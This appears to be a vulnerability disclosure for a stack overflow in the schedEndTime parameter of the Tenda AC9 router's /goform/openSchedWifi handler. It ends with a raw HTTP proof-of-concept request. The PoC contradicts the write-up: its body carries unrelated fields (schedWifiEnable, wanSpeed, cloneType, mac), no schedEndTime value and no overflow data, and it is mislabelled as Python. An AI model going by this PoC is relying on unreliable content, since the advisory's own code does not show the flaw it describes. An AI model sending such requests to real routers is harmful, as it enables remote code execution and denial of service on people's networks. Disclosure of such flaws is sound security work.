# Tenda AC9 V1.0 V15.03.05.14_multi stack overflow vulnerability
## Affected Version
Tenda AC9 V1.0 V15.03.05.14_multi
## Vulnerability Description
In Tenda ac9 v1.0 routers with firmware version V15.03.05.14_multi, the schedEndTime parameter of route /goform/openSchedWifi has a stack overflow vulnerability, which can lead to remote arbitrary code execution.
## Vulnerability Detail
There is a stack overflow vulnerability in the setSchedWifi function in Tenda AC9 V1.0 firmware V15.03.05.14_multi. The v21 obtains the schedEndTime parameter.   

![img](./img/openSchedWifi3.png)

The strcpy function does not check the size of the target buffer when processing the v21. If the data being copied exceeds the capacity of the buffer, a buffer overflow may occur. Attackers can easily perform denial-of-service attacks or remote code execution using well-designed overflow data.

![img](./img/openSchedWifi4.png)

## Poc
```py
POST /goform/openSchedWifi HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Cookie: password=452b97084f53fd461f33687a27a21f4dpxatgb

schedWifiEnable=0&&wanSpeed=200&wanSpeed2=300&cloneType=t&cloneType2=tt&mac=192.168.2.3&mac2=192.168.3.4
```
